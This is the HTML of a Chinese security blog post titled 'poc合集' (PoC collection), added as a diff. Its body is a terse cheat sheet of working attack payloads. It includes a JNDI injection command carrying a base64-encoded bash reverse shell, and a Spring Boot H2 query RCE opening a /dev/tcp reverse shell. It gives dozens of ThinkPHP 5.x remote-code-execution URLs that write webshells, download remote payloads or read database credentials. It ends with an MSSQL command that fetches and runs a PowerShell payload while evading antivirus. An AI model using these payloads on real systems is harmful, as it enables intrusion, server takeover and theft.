@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="jndi反弹 linux1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTAuMTU4LjEzNi4xOTkvOTAwMCAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="poc合集">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2022&#x2F;03&#x2F;01&#x2F;poc%E5%90%88%E9%9B%86&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="jndi反弹 linux1java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTAuMTU4LjEzNi4xOTkvOTAwMCAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#1">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2022-03-16T01:22:28.214Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/03/01/poc合集/"/>
+
+
+
+
+
+  <title>poc合集 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/03/01/poc%E5%90%88%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">poc合集</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-03-01T16:27:17+08:00">
+                2022-03-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  6
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="jndi反弹"><a href="#jndi反弹" class="headerlink" title="jndi反弹"></a>jndi反弹</h1><ul>
+<li>linux<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTAuMTU4LjEzNi4xOTkvOTAwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;47.103.36.44&quot;</span><br></pre></td></tr></table></figure>
+反弹地址和端口在base64里面，改动一下即可。改动端口记得去vps的防火墙开放端口，不然会被拦</li>
+<li>windows</li>
+</ul>
+<h1 id="shiro不出网无回显"><a href="#shiro不出网无回显" class="headerlink" title="shiro不出网无回显"></a>shiro不出网无回显</h1><ul>
+<li>windows<br><code>cmd /c for /r . %i in (style_new.css*) do ipconfig /all &gt; %i/../test222.txt</code></li>
+<li>linux<br><code>find /|grep query-advert-list.html|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done</code></li>
+</ul>
+<h1 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h1><h2 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h2><p>利用java的exec在linux系统下反弹shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&apos;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&apos;,&apos;me.getRun&apos;,&apos;time().exe&apos;,&apos;c(new String[]&#123;m1,m2,m3&#125;);&#125;&apos;);CALL T5(&apos;/bin/bash&apos;,&apos;-c&apos;,&apos;exec 5&lt;&gt;/dev/tcp/172.16.15.114/12345;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&apos;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考 <a href="https://github.com/LandGrey/SpringBootVulExploit#0x06restart-h2-database-query-rce" target="_blank" rel="noopener">https://github.com/LandGrey/SpringBootVulExploit#0x06restart-h2-database-query-rce</a></p>
+<h1 id="thinkphp"><a href="#thinkphp" class="headerlink" title="thinkphp"></a>thinkphp</h1><h2 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">tp 5.0.5</span><br><span class="line">get[]=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system</span><br><span class="line"> http://www.xxxx.com/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=2.php&amp;vars[1][1]=&lt;?php /*1111*//***/file_put_contents/*1**/(/***/&apos;index11.php&apos;/**/,file_get_contents(/**/&apos;https://www.hack.com/xxx.js&apos;))/**/;/**/?&gt;</span><br><span class="line"></span><br><span class="line">tp 5.0.10</span><br><span class="line">(post)public/index.php?s=index/index/index (data)s=whoami&amp;_method=__construct&amp;method&amp;filter[]=system</span><br><span class="line">get[]=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tp 5.0.11</span><br><span class="line"> http://www.xxxx.cn/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=curl https://www.hack.com/xxx.js -o ./upload/xxx.php</span><br><span class="line"></span><br><span class="line">tp &lt;= 5.0.13</span><br><span class="line">   post ?s=index/index   s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system</span><br><span class="line">   get[]=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system</span><br><span class="line"></span><br><span class="line">tp 5.0.14 </span><br><span class="line">eval（&apos;&apos;）和assert（&apos;&apos;）被拦截，命令函数被禁止</span><br><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo();</span><br><span class="line">http://www.xxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=eval($_GET[1])&amp;1=call_user_func_array(&quot;file_put_contents&quot;,array(&quot;3.php&quot;,file_get_contents(&quot;https://www.hack.com/xxx.js&quot;)));</span><br><span class="line"></span><br><span class="line">tp 5.0.18</span><br><span class="line">windows</span><br><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][0]=1</span><br><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][0]=phpinfo()</span><br><span class="line"></span><br><span class="line">使用certutil</span><br><span class="line">http://www.xxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=passthru&amp;vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php</span><br><span class="line">由于根目录没写权限，所以写到uploads</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tp 5.0.21</span><br><span class="line"> ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"> http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">tp 5.0.22</span><br><span class="line"> ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line"> http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.username</span><br><span class="line">http://192.168.1.1/thinkphp/public/?s=.|think\config/get&amp;name=database.password</span><br><span class="line">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">tp 5.0.23 </span><br><span class="line">(post)public/index.php?s=captcha (data) _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al //captcha可用</span><br><span class="line">(post)public/index.php (data)_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=touch%20/tmp/xxx //debug开启</span><br><span class="line"></span><br><span class="line">tp 5.0.x</span><br><span class="line">  ?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()</span><br><span class="line">tp 5.1.18</span><br><span class="line">http://www.xxxxx.com/?s=admin/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=index11.php&amp;vars[1][1]=&lt;?=file_put_contents(&apos;index_bak2.php&apos;,file_get_contents(&apos;https://www.hack.com/xxx.js&apos;));?&gt;</span><br><span class="line"></span><br><span class="line">tp5.1.29</span><br><span class="line"> ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"> </span><br><span class="line">tp 5.1.x</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=cmd</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cmd</span><br><span class="line"></span><br><span class="line">//实战测试</span><br><span class="line">s=ifconfig&amp;_method=__construct&amp;method=&amp;filter=system  在filter[]被特定拦截下。可以将filter[]替换为filter.</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&apos;qax.php&apos;,base64_decode(&apos;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pgo=&apos;))&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure>
+
+<h1 id="绕杀软上线"><a href="#绕杀软上线" class="headerlink" title="绕杀软上线"></a>绕杀软上线</h1><p>利用sqlps绕过杀软上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &apos;wscript.shell&apos;,@shell output exec sp_oamethod @shell,&apos;run&apos;,null,&apos;C:\Users\Public\SQLPS.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&apos;&apos;http://192.168.80.138:80/a&apos;&apos;))&quot;&apos;</span><br></pre></td></tr></table></figure>
+<p>参考链接<br><a href="https://mp.weixin.qq.com/s/XkleeVDz80WZy4NZqXhEfA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/XkleeVDz80WZy4NZqXhEfA</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/02/23/%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E4%B8%8E%E6%9F%A5%E6%9D%80%E6%8A%80%E6%9C%AF/" rel="next" title="后门检测与查杀技术">
+                <i class="fa fa-chevron-left"></i> 后门检测与查杀技术
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/03/03/%E5%86%85%E7%BD%91/" rel="prev" title="内网">
+                内网 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">57</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#jndi反弹"><span class="nav-number">1.</span> <span class="nav-text">jndi反弹</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro不出网无回显"><span class="nav-number">2.</span> <span class="nav-text">shiro不出网无回显</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#springboot"><span class="nav-number">3.</span> <span class="nav-text">springboot</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#restart-h2-database-query-RCE"><span class="nav-number">3.1.</span> <span class="nav-text">restart h2 database query RCE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkphp"><span class="nav-number">4.</span> <span class="nav-text">thinkphp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#thinkphp5"><span class="nav-number">4.1.</span> <span class="nav-text">thinkphp5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#绕杀软上线"><span class="nav-number">5.</span> <span class="nav-text">绕杀软上线</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">214.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
